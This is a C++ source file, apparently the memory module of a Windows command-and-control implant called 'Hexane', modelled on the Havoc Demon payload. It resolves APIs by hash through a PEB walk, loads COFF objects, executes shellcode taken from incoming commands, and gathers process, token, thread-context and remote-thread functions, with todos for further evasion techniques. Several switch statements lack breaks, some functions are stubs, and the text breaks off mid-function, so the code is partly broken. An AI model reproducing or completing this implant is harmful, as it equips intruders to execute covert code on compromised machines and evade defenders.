#include <core/include/memory.hpp>
#ifndef ENDIANESS
#define ENDIANESS 1
#endif

/*
 * todo: add foliage/silent moonwalk
 * todo: add dark loadlibrary
 * todo: error responses
 */

namespace Memory {
    LPVOID ExceptionReturn = { };

    namespace Methods {

        BOOL MoveFilePointer(HANDLE handle, int32_t offset, int32_t* current) {
            HEXANE

            *current += offset;
            if (!Ctx->win32.SetFilePointer(handle, *current, nullptr, FILE_BEGIN)) {
                return false;
            }

            return true;
        }

        UINT_PTR GetStackCookie() {
            HEXANE

            uintptr_t cookie = 0;
            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                cookie = 0;
            }
            return cookie;
        }

        VOID GetProcessHeaps(HANDLE process, const uint32_t access, const uint32_t pid) {
            HEXANE

            HANDLE snap = { };
            HEAPLIST32 heaps = { };
            heaps.dwSize = sizeof(HEAPLIST32);

            if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
                return;
            }

            snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
            if (snap == INVALID_HANDLE_VALUE) {
                return;
            }

            if (Ctx->win32.Heap32ListFirst(snap, &heaps)) {
                do {
                    //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
                    //m_heaps.push_back(heap_info);
                }
                while (Ctx->win32.Heap32ListNext(snap, &heaps));
            }
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
            HEXANE

            HRSRC res_info = { };
            _resource* object = { };

            object = S_CAST(_resource*,  x_malloc(sizeof(_resource)));
            if (
                !(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
                !(object->h_global  = Ctx->win32.LoadResource(base, res_info)) ||
                !(object->size      = Ctx->win32.SizeofResource(base, res_info)) ||
                !(object->res_lock  = Ctx->win32.LockResource(object->h_global))) {

                x_free(object);
                return nullptr;
            }

            return object;
        }

        _executable* CreateImageData(uint8_t *data) {
            HEXANE
            _executable *image = R_CAST(_executable*, x_malloc(sizeof(_executable)));

            image->buffer   = data;
            image->dos_head = P_IMAGE_DOS_HEADER(image->buffer);
            image->nt_head  = P_IMAGE_NT_HEADERS(image->buffer, image->dos_head);
            image->exports  = P_IMAGE_EXPORT_DIRECTORY(image->dos_head, image->nt_head);

            return image;
        }
    }

    namespace Context {

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance    = { };
            size_t region_size  = 0;
            void *region        = { };

            instance.teb = NtCurrentTeb();
            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            __debugbreak();
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            region      = C_PTR(instance.base.address + &__global);
            region_size = sizeof(void*);

            if (
                !(instance.modules.ntdll = M_PTR(NTDLL)) ||
                !(F_PTR_HMOD(instance.nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(instance.nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX))) {
                return;
            }

            if (!NT_SUCCESS(instance.nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
                return;
            }
            region = C_PTR(GLOBAL_OFFSET);
            if (!(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return;
            }

            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
            x_memset(&instance, 0, sizeof(_hexane));
            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
        }

        VOID ContextDestroy(_hexane* Ctx) {
            // todo: needs expanded to destroy all strings (http/smb context + anything else)

            auto RtlFreeHeap = Ctx->nt.RtlFreeHeap;
            auto Heap = Ctx->heap;

            x_memset(Ctx, 0, sizeof(_hexane));

            if (RtlFreeHeap) {
                RtlFreeHeap(Heap, 0, Ctx);
            }
        }

        VOID ResolveApi() {
            HEXANE

            OSVERSIONINFOW OSVersionW = { };
            x_memset(&Ctx->little, ENDIANESS, 1);

            if (!(Ctx->modules.kernel32 = M_PTR(KERNEL32))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (!(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
            Ctx->session.version = WIN_VERSION_UNKNOWN;
            OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);

            if (!NT_SUCCESS(Ctx->nt.RtlGetVersion(&OSVersionW))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (OSVersionW.dwMajorVersion >= 5) {
                if (OSVersionW.dwMajorVersion == 5) {
                    if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->session.version = WIN_VERSION_XP;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 6) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->session.version = WIN_VERSION_2008;
                    }
                    else if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->session.version = WIN_VERSION_2008_R2;
                    }
                    else if (OSVersionW.dwMinorVersion == 2) {
                        Ctx->session.version = WIN_VERSION_2012;
                    }
                    else if (OSVersionW.dwMinorVersion == 3) {
                        Ctx->session.version = WIN_VERSION_2012_R2;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 10) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->session.version = WIN_VERSION_2016_X;
                    }
                }
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.GetLastError, Ctx->modules.kernel32, GETLASTERROR)) ||
                !(F_PTR_HMOD(Ctx->win32.IsWow64Process, Ctx->modules.kernel32, ISWOW64PROCESS)) ||
                !(F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx, Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
                !(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory, Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap, Ctx->modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory, Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory, Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory, Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory, Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->nt.NtCreateSection, Ctx->modules.ntdll, NTCREATESECTION)) ||
                !(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection, Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ||
                !(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection, Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ||

                !(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess, Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ||
                !(F_PTR_HMOD(Ctx->nt.NtTerminateProcess, Ctx->modules.ntdll, NTTERMINATEPROCESS)) ||
                !(F_PTR_HMOD(Ctx->nt.NtOpenProcess, Ctx->modules.ntdll, NTOPENPROCESS)) ||
                !(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken, Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ||
                !(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken, Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ||
                !(F_PTR_HMOD(Ctx->nt.NtDuplicateObject, Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->nt.NtDuplicateToken, Ctx->modules.ntdll, NTDUPLICATETOKEN)) ||
                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken, Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess, Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
                !(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation, Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
                !(F_PTR_HMOD(Ctx->nt.NtClose, Ctx->modules.ntdll, NTCLOSE)) ||

                !(F_PTR_HMOD(Ctx->nt.RtlRandomEx, Ctx->modules.ntdll, RTLRANDOMEX)) ||
                !(F_PTR_HMOD(Ctx->nt.NtResumeThread, Ctx->modules.ntdll, NTRESUMETHREAD)) ||
                !(F_PTR_HMOD(Ctx->nt.NtGetContextThread, Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->nt.NtSetContextThread, Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->nt.NtSetInformationThread, Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ||
                !(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject, Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->nt.TpAllocWork, Ctx->modules.ntdll, TPALLOCWORK)) ||
                !(F_PTR_HMOD(Ctx->nt.TpPostWork, Ctx->modules.ntdll, TPPOSTWORK)) ||
                !(F_PTR_HMOD(Ctx->nt.TpReleaseWork, Ctx->modules.ntdll, TPRELEASEWORK)) ||

                !(F_PTR_HMOD(Ctx->nt.RtlCreateHeap, Ctx->modules.ntdll, RTLCREATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap, Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlFreeHeap, Ctx->modules.ntdll, RTLFREEHEAP)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap, Ctx->modules.ntdll, RTLDESTROYHEAP)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString, Ctx->modules.ntdll, RTLINITUNICODESTRING)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx, Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
                !(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters, Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.FormatMessageA, Ctx->modules.kernel32, FORMATMESSAGEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot, Ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32First, Ctx->modules.kernel32, PROCESS32FIRST)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32Next, Ctx->modules.kernel32, PROCESS32NEXT)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateRemoteThread, Ctx->modules.kernel32, CREATEREMOTETHREAD)) ||
                !(F_PTR_HMOD(Ctx->win32.GetComputerNameExA, Ctx->modules.kernel32, GETCOMPUTERNAMEEXA)) ||
                !(F_PTR_HMOD(Ctx->win32.GetLocalTime, Ctx->modules.kernel32, GETLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.Heap32ListFirst, Ctx->modules.kernel32, HEAP32LISTFIRST)) ||
                !(F_PTR_HMOD(Ctx->win32.Heap32ListNext, Ctx->modules.kernel32, HEAP32LISTNEXT)) ||
                !(F_PTR_HMOD(Ctx->win32.SleepEx, Ctx->modules.kernel32, SLEEPEX)) ||

                !(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA, Ctx->modules.kernel32, GETCURRENTDIRECTORYA)) ||
                !(F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime, Ctx->modules.kernel32, FILETIMETOSYSTEMTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime, Ctx->modules.kernel32, GETSYSTEMTIMEASFILETIME)) ||
                !(F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFullPathNameA, Ctx->modules.kernel32, GETFULLPATHNAMEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateFileW, Ctx->modules.kernel32, CREATEFILEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ReadFile, Ctx->modules.kernel32, READFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.WriteFile, Ctx->modules.kernel32, WRITEFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFileSizeEx, Ctx->modules.kernel32, GETFILESIZEEX)) ||
                !(F_PTR_HMOD(Ctx->win32.FindFirstFileA, Ctx->modules.kernel32, FINDFIRSTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindNextFileA, Ctx->modules.kernel32, FINDNEXTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindClose, Ctx->modules.kernel32, FINDCLOSE)) ||
                !(F_PTR_HMOD(Ctx->win32.SetFilePointer, Ctx->modules.kernel32, SETFILEPOINTER)) ||

                !(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW, Ctx->modules.kernel32, CREATENAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.CallNamedPipeW, Ctx->modules.kernel32, CALLNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.WaitNamedPipeW, Ctx->modules.kernel32, WAITNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ConnectNamedPipe, Ctx->modules.kernel32, CONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe, Ctx->modules.kernel32, DISCONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState, Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE)) ||
                !(F_PTR_HMOD(Ctx->win32.PeekNamedPipe, Ctx->modules.kernel32, PEEKNAMEDPIPE))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }
            defer:
        }

    }

    namespace Objects {

        UINT_PTR GetInternalAddress(uint32_t name, bool* internal) {
            HEXANE

            return 0;
        }

        BOOL BaseRelocation(_executable *object) {
            HEXANE

            _symbol *symbol     = { };
            char symbol_name[9] = { };
            char *entry_name    = { };
            bool success        = true;

            uint32_t hash       = 0;
            uintptr_t offset    = 0;
            uint32_t count      = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section     = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc       = R_CAST(_reloc*, U_PTR(object->buffer) + object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {

                    symbol = &object->symbol[object->reloc->SymbolTableIndex];
                    if (symbol->First.Value[0] != 0) {
                        x_memset(symbol_name, 0, sizeof(symbol_name));
                        x_memcpy(symbol_name, symbol->First.Name, 8);

                        entry_name = symbol_name;
                    } else {
                        entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                    }

                    hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));

                    void *reloc     = object->sec_map[j].address + object->reloc->VirtualAddress;
                    void *sym_sec   = object->sec_map[symbol->SectionNumber - 1].address;
                    void *fn_map    = object->fn_map + sizeof(void*) * count;
                    void *function  = C_PTR(ResolveSymbol(object, hash, symbol->Type));

                    switch (function != nullptr) {
#if _WIN64
                    case true: {
                        switch (object->reloc->Type == IMAGE_REL_AMD64_REL32) {

                        case true: {
                            *R_CAST(void**, fn_map) = function;
                            offset = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));

                            *S_CAST(uintptr_t*, reloc) = offset;
                            count++;
                        }
                        default:
                            success_(false);
                        }
                    }
                    case false:

                        switch (object->reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_REL32_1: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 1;

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_REL32_2: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 2;

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_REL32_3: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 3;

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_REL32_4: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(UINT32) - 4;

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_REL32_5: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 5;

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_ADDR32NB: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_AMD64_ADDR64: {
                            offset = *S_CAST(uint64_t*, reloc);
                            offset += U_PTR(sym_sec);

                            *S_CAST(uint64_t*, reloc) = offset;
                        }
                        default:
                            success_(false);
                        }
#else
                    case true: {
                        switch (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                        case true: {
                            *S_CAST(void**, fn_map) = func;
                            offset = U_PTR(fn_map);

                            *S_CAST(uint32_t*, reloc) = offset;
                            count++;
                        }
                        default:
                            success_(false);
                        }
                    }
                    case false: {
                        switch (object->reloc->Type) {
                        case IMAGE_REL_I386_REL32: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        case IMAGE_REL_I386_DIR32: {
                            offset = *S_CAST(uint32_t*, reloc);
                            offset += U_PTR(sym_sec);

                            *S_CAST(uint32_t*, reloc) = offset;
                        }
                        default:
                            success_(false);
                        }
                    }
#endif
                    default:
                        success_(false);
                    }

                    object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc)  + sizeof(_reloc)));
                }
            }

            defer:
            return success;
        }

        UINT_PTR ResolveSymbol(_executable *object, const uint32_t entry_name, uint32_t type) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
            HEXANE

            uintptr_t address = { };
            bool is_internal = false;

            if ((address = Memory::Objects::GetInternalAddress(entry_name, &is_internal)) && is_internal) {
                return address;
            } else {
                char *lib_name = { };
                char *fn_name = { };
                // todo: change cmd_map to func_map and add every function
                /*
                 * ok, hear me out:
                 *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
                 *      map[string]string = strings.Split(name, "$")
                 *
                 *      LoadExport(module, function);
                 */

                address = Modules::LoadExport(lib_name, fn_name);
                return address;
            }
        }

        SIZE_T GetFunctionMapSize(_executable *object) {
            HEXANE

            char name[9]        = { };
            char *symbol_name   = { };

            _symbol *symbol     = { };
            uint32_t n_funcs    = 0;

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {

                object->section    = P_IMAGE_SECTION_HEADER(object->buffer, i);
                object->reloc      = R_CAST(_reloc*, object->section->PointerToRelocations);

                for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                    symbol = &object->symbol[object->reloc->SymbolTableIndex];

                    if (symbol->First.Value[0] != 0) {
                        x_memset(name, 0, sizeof(name));
                        x_memcpy(name, symbol->First.Name, 8);
                        symbol_name = name;

                    } else {
                        symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                    }
                    if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                        n_funcs++;
                    }

                    object->reloc = object->reloc + sizeof(_reloc);
                }
            }

            return sizeof(void*) * n_funcs;
        }

        BOOL MapSections(_executable *object, const uint8_t *const data) {
            HEXANE

            uint8_t *next = { };

            object->fn_map->size = GetFunctionMapSize(object);
            object->sec_map = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));

            if (!object->sec_map) {
                return_defer(ERROR_REPARSE_OBJECT);
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(data, i);
                object->size    += object->section->SizeOfRawData;
                object->size    = R_CAST(size_t, PAGE_ALIGN(object->size));
            }

            object->size += object->fn_map->size;
            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                return_defer(ntstatus);
            }

            next = object->buffer;
            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);

                object->sec_map[i].size = object->section->SizeOfRawData;
                object->sec_map[i].address = next;

                next += object->section->SizeOfRawData;
                next = PAGE_ALIGN(next);

                x_memcpy(object->sec_map[i].address, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
            }

            object->fn_map = R_CAST(_object_map*, next);

            defer:
            if (ntstatus != ERROR_SUCCESS) {
                return false;
            }

            return true;
        }
    }

    namespace Modules {

        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
            return R_CAST(HMODULE, data->DllBase);
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
            // todo: replace PEB_POINTER with custom impl

            const auto head = R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList);

            for (auto next = head->Flink; next != head; next = next->Flink) {
                wchar_t lowercase[MAX_PATH] = { };

                const auto mod = R_CAST(LDR_DATA_TABLE_ENTRY*, B_PTR(next) - sizeof(uint32_t) * 4);
                const auto name = mod->BaseDllName;

                if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                    return mod;
                }
            }

            return nullptr;
        }

        FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {

            FARPROC address = { };
            char lowercase[MAX_PATH] = { };

            const auto dos_head = P_IMAGE_DOS_HEADER(base);
            const auto nt_head = P_IMAGE_NT_HEADERS(base, dos_head);
            const auto exports = P_IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);

            if (exports->AddressOfNames) {
                const auto ords = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
                const auto funcs = RVA(uint32_t*, base, exports->AddressOfFunctions);
                const auto names = RVA(uint32_t*, base, exports->AddressOfNames);

                for (auto i = 0; i < exports->NumberOfNames; i++) {
                    const auto name = RVA(char*, base, names[i]);

                    x_memset(lowercase, 0, MAX_PATH);

                    if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
                        address = R_CAST(FARPROC, RVA(PULONG, base, funcs[ords[i]]));
                        break;
                    }
                }
            }

            return address;
        }

        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
            HEXANE

            uintptr_t symbol = 0;
            int reload = 0;

            const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
            const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));

            while (!symbol) {
                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                    if (reload || !Ctx->win32.LoadLibraryA(S_CAST(const char*, module_name))) {
                        goto defer;
                    }
                    reload = 1;
                }
            }

            defer:
            return symbol;
        }
    }

    namespace Scanners {

        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
            HEXANE

            uintptr_t ret = 0;
            const auto address = R_CAST(uintptr_t, target);

            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000;
                 ret < address + 0x70000000;
                 ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {
            for (; *mask; ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return FALSE;
                }
            }
            return (*mask == 0x00);
        }

        UINT_PTR SignatureScan(const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
            HEXANE

            size_t read = 0;
            uintptr_t address = 0;
            auto buffer = R_CAST(uint8_t*, x_malloc(size));

            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
                return_defer(ntstatus);
            }

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            x_memset(buffer, 0, size);

            defer:
            if (buffer) {
                x_free(buffer);
            }

            return address;
        }
    }

    namespace Execute {

        LONG WINAPI Debugger(EXCEPTION_POINTERS *exception) {
            HEXANE

            exception->ContextRecord->IP_REG = U_PTR(ExceptionReturn);
            ntstatus = exception->ExceptionRecord->ExceptionCode;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        VOID ExecuteCommand(_parser &parser) {
            HEXANE

            _command cmd        = { };
            uintptr_t address   = { };

            bool is_internal    = false;
            const auto cmd_id   = Parser::UnpackDword(&parser);

            if (cmd_id == NOJOB) {
                goto defer;
            }

            if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
                return_defer(ntstatus);
                // todo: error_transmit("command not found : %s")
            }

            cmd = R_CAST(_command, Ctx->base.address + address);
            cmd(&parser);

            defer:
        }

        VOID ExecuteShellcode(const _parser& parser) {
            HEXANE

            void* address   = { };
            void (*exec)()  = { };
            size_t size = parser.Length;

            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                return_defer(ntstatus);
            }

            x_memcpy(address, parser.buffer, parser.Length);
            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
                return_defer(ntstatus);
            }

            exec = R_CAST(void(*)(), address);
            exec();

            x_memset(address, 0, size);

        defer:
            if (address) {
                ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
            }
        }

        BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
            HEXANE

            bool success        = false;
            char *symbol_name   = { };
            void *veh_handler   = { };
            void *exec          = { };

            if (!(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger))) {
                return_defer(ERROR_INVALID_EXCEPTION_HANDLER);
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                object->section =  P_IMAGE_SECTION_HEADER(object->buffer, i);

                if (object->section->SizeOfRawData > 0) {
                    uint32_t protection = 0;

                    switch (object->section->Characteristics & IMAGE_SCN_MEM_RWX) {
                    case NULL:                  protection = PAGE_NOACCESS;
                    case IMAGE_SCN_MEM_READ:    protection = PAGE_READONLY;
                    case IMAGE_SCN_MEM_RX:      protection = PAGE_EXECUTE_READ;
                    case IMAGE_SCN_MEM_RW:      protection = PAGE_READWRITE;
                    case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
                    case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
                    default: protection = PAGE_EXECUTE_READWRITE;
                    }

                    if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                        protection |= PAGE_NOCACHE;
                    }

